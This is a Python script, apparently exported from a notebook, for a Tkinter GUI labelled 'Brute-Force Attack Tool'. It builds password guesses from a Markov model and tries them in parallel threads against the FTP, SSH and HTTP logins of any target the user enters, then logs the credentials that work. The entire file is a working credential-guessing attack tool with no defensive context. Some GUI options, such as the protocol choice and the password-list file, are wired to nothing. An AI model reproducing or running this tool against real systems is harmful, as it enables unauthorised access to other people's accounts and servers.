
import tkinter as tk
from tkinter import scrolledtext
from tkinter import filedialog
import ftplib
import paramiko
import requests
import threading
import random
import pickle

# Load pre-trained Markov Model for password prediction
try:
    with open("markov_model_3gram.pkl", "rb") as f:
        markov_model = pickle.load(f)
except FileNotFoundError:
    markov_model = {}

def generate_passwords(seed, num=10):
    """ Generate AI-based passwords using a Markov model """
    passwords = set()
    for _ in range(num):
        password = seed
        for _ in range(random.randint(4, 12)):
            next_chars = markov_model.get(password[-2:], list("abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*"))
            password += random.choice(next_chars)
        passwords.add(password)
    return list(passwords)

def ftp_bruteforce(target_ip, username, passwords):
    for password in passwords:
        try:
            ftp = ftplib.FTP(target_ip)
            ftp.login(username, password)
            output_text.insert(tk.END, f"\n[✅] FTP Login Successful: {username}:{password}\n")
            ftp.quit()
            return
        except ftplib.error_perm:
            output_text.insert(tk.END, f"\n[❌] FTP Failed: {password}\n")

def ssh_bruteforce(target_ip, username, passwords):
    for password in passwords:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, username=username, password=password, timeout=2)
            output_text.insert(tk.END, f"\n[✅] SSH Login Successful: {username}:{password}\n")
            ssh.close()
            return
        except:
            output_text.insert(tk.END, f"\n[❌] SSH Failed: {password}\n")

def http_bruteforce(url, username, passwords):
    for password in passwords:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        if "success" in response.text.lower():
            output_text.insert(tk.END, f"\n[✅] HTTP Login Successful: {username}:{password}\n")
            return
        output_text.insert(tk.END, f"\n[❌] HTTP Failed: {password}\n")

def run_attack():
    target_ip = target_entry.get().strip()
    http_url = url_entry.get().strip()
    username = username_entry.get().strip()
    
    if not target_ip or not username:
        output_text.insert(tk.END, "\n[⚠️] Please enter Target IP and Username!\n")
        return
    
    output_text.insert(tk.END, "\n[🔹] Generating AI-based passwords...\n")
    passwords = generate_passwords(seed="pa", num=20)
    
    threading.Thread(target=ftp_bruteforce, args=(target_ip, username, passwords)).start()
    threading.Thread(target=ssh_bruteforce, args=(target_ip, username, passwords)).start()
    
    if http_url:
        threading.Thread(target=http_bruteforce, args=(http_url, username, passwords)).start()
    
    output_text.insert(tk.END, "\n[✅] Attack Completed! Check logs for results.\n")
    
def browse_file():
    file_path = filedialog.askopenfilename()
    password_path.set(file_path)

def run_attack_threaded():
    threading.Thread(target=run_attack).start()    

# GUI Setup
root = tk.Tk()
root.title("Brute-Force Attack Tool")
root.geometry("750x650")
root.resizable(False, False)

# Target IP
tk.Label(root, text="Target IP (for FTP/SSH):").pack()
target_entry = tk.Entry(root, width=70)
target_entry.pack()

# HTTP URL
tk.Label(root, text="HTTP URL (for HTTP attacks):").pack()
url_entry = tk.Entry(root, width=70)
url_entry.pack()

# Username
tk.Label(root, text="Username:").pack()
username_entry = tk.Entry(root, width=70)
username_entry.pack()

# Protocol
tk.Label(root, text="Select Protocol:").pack()
protocol_choice = tk.StringVar(value="FTP")
tk.OptionMenu(root, protocol_choice, "FTP", "SSH", "HTTP").pack()

# Password list
tk.Label(root, text="Password List File:").pack()
password_path = tk.StringVar()
tk.Entry(root, textvariable=password_path, width=50).pack(side=tk.LEFT, padx=5, pady=5)
tk.Button(root, text="Browse", command=browse_file).pack(side=tk.LEFT)

# Run Button
tk.Button(root, text="Run Attack", command=run_attack_threaded).pack(pady=10)

# Output Log
output_text = scrolledtext.ScrolledText(root, width=90, height=25, wrap=tk.WORD)
output_text.pack(pady=10)

# Run GUI
root.mainloop()








# In[ ]:




